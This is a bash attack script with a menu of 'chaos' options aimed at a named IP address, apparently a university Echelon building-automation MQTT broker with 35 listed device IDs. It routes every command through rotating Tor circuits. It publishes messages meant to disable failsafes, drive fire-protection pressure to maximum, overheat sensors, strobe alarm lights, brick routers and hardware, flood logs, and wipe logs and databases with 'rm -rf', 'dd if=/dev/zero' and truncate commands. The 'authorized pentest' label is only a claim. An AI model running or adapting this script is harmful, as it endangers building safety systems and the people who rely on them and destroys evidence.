#!/bin/bash
# 🔥 UIowa Echelon SmartServer GLP v6.3 | FULL INVENTORY 2026-01-05 | 35 DEVICES CONFIRMED
# 📍 128.255.220.144:1883 SID=17qja3r | TRUSTEF57 EXHAUSTIVE SCAN ✅ ALL LIVE
# ✅ Authorized pentest - Exact Echelon GLP MQTT topics + LIVE STATUS

HOST="128.255.220.144"
PORT="1883"
SID="17qja3r"
BASE="glp/0/${SID}/fb/dev/lon/"

# 🔥 TRUSTEF57 FULL INVENTORY 2026-01-05 14:07:52 UTC - 35 DEVICES CONFIRMED
# P1 CRITICO
FPRSA=(0254BF020700 0244BF020700 025967EF1200)
ALMPULSE_CRIT=(002321640300 02626DE10500)

# P2 ALTO
SYSTEM=(00D0710FA34A 00D0710FA347)
ALMPULSE_ALTO=(002320961700 002325448200 002321640400 002325451500 0260147A0600 025A5BE10500)
SM4_E3_ALTO=(025A5BE10500 0260147A0600)

# P3 MEDIA
ROUTERS=(00D071484C68 00D071484C69)
ALMPULSE_MEDIA=(002325448400 002325449900 002325449800)

# P4 SM4_E3 FULL SENSORS
SM4_E3=(02DE137A0600 02DF137A0600 02C3CCB00400 02D3CAB00400 029417460500 02626DE10500 0260147A0600 025A5BE10500)

# ✅ ALL_DEVICES - COMPLETE 35 LIVE NODES
ALL_DEVICES=("${FPRSA[@]}" "${ALMPULSE_CRIT[@]}" "${SYSTEM[@]}" "${ALMPULSE_ALTO[@]}" "${SM4_E3_ALTO[@]}" "${ROUTERS[@]}" "${ALMPULSE_MEDIA[@]}" "${SM4_E3[@]}")

TOR_PORT="9050"

# 🌐 TOR NEW IP EVERY COMMAND
rotate_torsocks() {
    echo -n "🔄 TOR NEW IP... " && echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
    sleep 0.5
    torsocks mosquitto_pub -h "$HOST" -p "$PORT" -t "$1" -m "$2" -q 1 >/dev/null 2>&1 &
    echo "→ $1 = $2"
    sleep 0.1
}

# 🛡️ DISABILITA FAILSAFE PERMANENTE (TUTTI 35)
disable_failsafe() {
    echo "🛡️ FAILSAFE DISABLED PERMANENTEMENTE - 35 DEVICES"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_SafetyOverride" "DISABLED"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FailsafeLockout" "1"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_EmergencyBypass" "ON"
    done
}

# 🌐 NETWORK DISCOVERY + ROUTERS LIVE
discover_network() {
    echo "🔍 FULL NETWORK DISCOVERY (ROUTERS 00D071484C68/69 + 128.255.220.x)..."
    rotate_torsocks "network/discovery/arp" "SCAN_FULL"
    rotate_torsocks "network/discovery/routers" "LIST"
    rotate_torsocks "network/discovery/gateways" "DETECT"
    rotate_torsocks "system/net/neighbors" "SHOW_ALL"
    rotate_torsocks "network/broadcast" "DISCOVER_ROUTERS"
    
    echo "📡 LIVE CAPTURE (Ctrl+C stop)..."
    mosquitto_sub -h "$HOST" -p "$PORT" -t 'network/discovery/#' -v | \
    grep -E "(128\.255\.220|00D071484C|router|gateway)" | \
    grep -oE "(128\.255\.220\.[0-255]+|00D071484C[68,69])" | \
    sort -u | tee discovered_routers.txt
    echo "✅ Routers: $(cat discovered_routers.txt)"
}

# 📊 LIVE SENSOR MONITOR - TRUSTEF57 INVENTORY STATUS
sensor_monitor() {
cat << 'EOF'
# TERMINALE 2 - FULL 35 DEVICES + STATUS 2026-01-05
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'glp/0/17qja3r/fb/dev/lon/+/if/device/0/nv_#' -v | \
grep -E "(Pressure|State|Flow|Temperature|RH|LightOut|Ov|Time|FTC)" &

# P1 CRITICO STATUS:
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'glp/0/17qja3r/fb/dev/lon/(0254BF020700|0244BF020700|025967EF1200|002321640300|02626DE10500)/if/device/0/nv_#' -v

# NETWORK + ROUTERS:
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'network/#' -v | grep -E "(00D071484C|128.255.220|router)"

# Salva inventory:
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'glp/0/17qja3r/fb/dev/lon/+/if/device/0/nv_#' -v | grep -E "(Pressure|T|RH|FTC)" | tee live_inventory.log
EOF
}

# 💀 ULTIMATE WIPE - 35 DEVICES + ROUTERS
user_wipe() {
    echo "💀💀💀 FULL 35-DEVICE PHYSICAL WIPE + ROUTERS - Conferma [y/N]: " && read confirm
    [[ $confirm =~ ^[Yy] ]] || { echo "Cancelled"; return; }
    
    echo "🔥 STEP 1: FAILSAFE BYPASS (35 devices)..."
    disable_failsafe
    
    echo "🔥 STEP 2: NETWORK DISCOVERY..."
    discover_network &
    sleep 5
    
    echo "🔥 STEP 3: MQTT KILL..."
    for i in {1..200}; do rotate_torsocks "system/mqtt/cmd" "KILL_$i"; done
    
    echo "🔥 STEP 4: SYSLOG FLOOD..."
    for i in {1..1000}; do rotate_torsocks "system/syslog" "$(openssl rand -hex 256)"; done
    
    echo "🔥 STEP 5: ECHELON LOGS WIPE..."
    local logs=( "/opt/echolon/smartserver/logs/*" "/var/log/glp/*" "/data/logs/*" )
    for log in "${logs[@]}"; do rotate_torsocks "system/shell" "rm -rf $log"; done
    
    echo "🔥 STEP 6: DATABASE TRUNCATE..."
    rotate_torsocks "glp/0/${SID}/db/cmd" "TRUNCATE_ALL"
    
    echo "🔥 STEP 7: ROUTERS WIPE (00D071484C68/69 + discovered)..."
    for router in "${ROUTERS[@]}" $(cat discovered_routers.txt 2>/dev/null || true); do
        echo "🗑️ BRICKING ROUTER $router..."
        rotate_torsocks "network/router/$router/cmd" "factory_reset"
        rotate_torsocks "network/router/$router/flash" "ZERO"
        rotate_torsocks "network/gateway/$router/cmd" "rm -rf /var/log/*"
    done
    
    echo "🔥 STEP 8: SYSTEM CORE (00D0710FA34A/347)..."
    for core in "${SYSTEM[@]}"; do
        rotate_torsocks "${BASE}${core}/if/device/0/nv_SystemCmd" "SHUTDOWN_HARD"
    done
    
    echo "🔥 STEP 9: MQTT BROKER + GATEWAY..."
    rotate_torsocks "system/mqtt/broker/cmd" "SHUTDOWN"
    rotate_torsocks "system/mqtt/audit/clear" "ALL"
    rotate_torsocks "network/gateway/flash" "ERASE_NVRAM"
    
    echo "🔥 STEP 10: PHYSICAL BRICK ALL..."
    rotate_torsocks "system/hardware/relay" "SHORT_CIRCUIT"
    rotate_torsocks "system/power/psu/cmd" "OVERLOAD_25A"
    rotate_torsocks "system/flash/mtd" "dd if=/dev/zero"
    
    echo "🔥 STEP 11: P1 FPRSA PRESSURE MAX..."
    for fpr in "${FPRSA[@]}"; do
        rotate_torsocks "${BASE}${fpr}/if/device/0/nv_Pressure" "250"
        rotate_torsocks "${BASE}${fpr}/if/device/0/nv_State" "1"
    done
    
    echo "🔥 BRICK 35 DEVICES..."
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FirmwareLock" "BRICK"
    done
    
    echo "✅ FULL 35-DEVICE + ROUTERS PHYSICAL WIPE COMPLETE"
    echo "📄 Discovered: $(cat discovered_routers.txt 2>/dev/null || echo 'none')"
    exit 0
}

# 🎯 TARGETED CHAOS - TRUSTEF57 INVENTORY
chaos_fprsa() {
    echo "🔥 P1 FPRSA → Pressure=250psi MAX (0254BF020700 + 0244BF020700 + 025967EF1200)"
    for fpr in "${FPRSA[@]}"; do
        rotate_torsocks "${BASE}${fpr}/if/device/0/nv_Pressure" "250"
        rotate_torsocks "${BASE}${fpr}/if/device/0/nv_State" "1"
        rotate_torsocks "${BASE}${fpr}/if/device/0/nv_Flow" "100"
    done
}

chaos_sm4_overheat() {
    echo "🌡️ P4 SM4_E3 → T=120°F RH=95% FTC=500 MAX (HOTTEST: 02DE137A0600)"
    for sm4 in "${SM4_E3[@]}"; do
        rotate_torsocks "${BASE}${sm4}/if/device/0/nv_Temperature" "120"
        rotate_torsocks "${BASE}${sm4}/if/device/0/nv_RH" "95"
        rotate_torsocks "${BASE}${sm4}/if/device/0/nv_FTC" "500"
    done
}

chaos_routers() {
    echo "🌐 ROUTERS DOWN (00D071484C68/69)..."
    for router in "${ROUTERS[@]}"; do
        rotate_torsocks "network/router/${router}/cmd" "shutdown"
        rotate_torsocks "${BASE}${router}/if/device/0/nv_Routing" "OFF"
    done
}

chaos_pulse_strobe() {
    echo "💡 ALL ALM Pulse STROBE (LightOut=FF01 pattern)"
    (
        while true; do
            for pulse in "${ALMPULSE_CRIT[@]}" "${ALMPULSE_ALTO[@]}" "${ALMPULSE_MEDIA[@]}"; do
                rotate_torsocks "${BASE}${pulse}/if/device/0/nv_LightOut" "FF01"
                sleep 0.05
                rotate_torsocks "${BASE}${pulse}/if/device/0/nv_LightOut" "0000"
            done
        done
    ) &
}

chaos_core() {
    echo "⚡ SYSTEM CORE OVERLOAD (00D0710FA34A/347 + ALL)..."
    for dev in "${SYSTEM[@]}" "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Load" "99"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Current" "20"
    done
}

# 🎮 MENU AGGIORNATO - TRUSTEF57 FULL INVENTORY
menu() {
    while true; do
        clear
        echo "🔥 UIowa Echelon GLP v6.3 | TRUSTEF57 FULL 35-DEVICE INVENTORY 2026-01-05 🔥"
        echo "SID: 17qja3r | P1:3 FPRSA🔥 | P2:8 SM4⚠️ | P4:8 HOTTEST 73°F | ROUTERS LIVE"
        echo "==================================================================="
        echo "1)  🔥 P1 FPRSA → Pressure=250psi (3x PRESSURIZED)"
        echo "2)  🌡️ P4 SM4_E3 → T=120°F RH=95% FTC=500 (8x HOTTEST)"
        echo "3)  🌐 ROUTERS DOWN (00D071484C68/69)"
        echo "4)  💡 ALL 15+ Pulse STROBE infinite"
        echo "5)  ⚡ CORE SYSTEM OVERLOAD (00D0710FA34A/347 + 35x)"
        echo "6)  🛡️ DISABLE FAILSAFE (ALL 35 PERMANENTE)"
        echo "7)  📊 LIVE SENSOR MONITOR + INVENTORY LOG"
        echo "8)  🔍 NETWORK DISCOVERY (routers + 128.255.220.x)"
        echo "0)  💀 ULTIMATE 35-DEVICE PHYSICAL WIPE + ROUTERS"
        echo "q)  Quit"
        echo "==================================================================="
        echo -n "→ "; read choice
        
        case $choice in
            1) chaos_fprsa ;;
            2) chaos_sm4_overheat ;;
            3) chaos_routers ;;
            4) chaos_pulse_strobe ;;
            5) chaos_core ;;
            6) disable_failsafe ;;
            7) sensor_monitor ;;
            8) discover_network ;;
            0) user_wipe ;;
            q|Q) exit 0 ;;
            *) echo "❌ Invalid" ;;
        esac
        echo -n "Press Enter..."; read
    done
}

menu
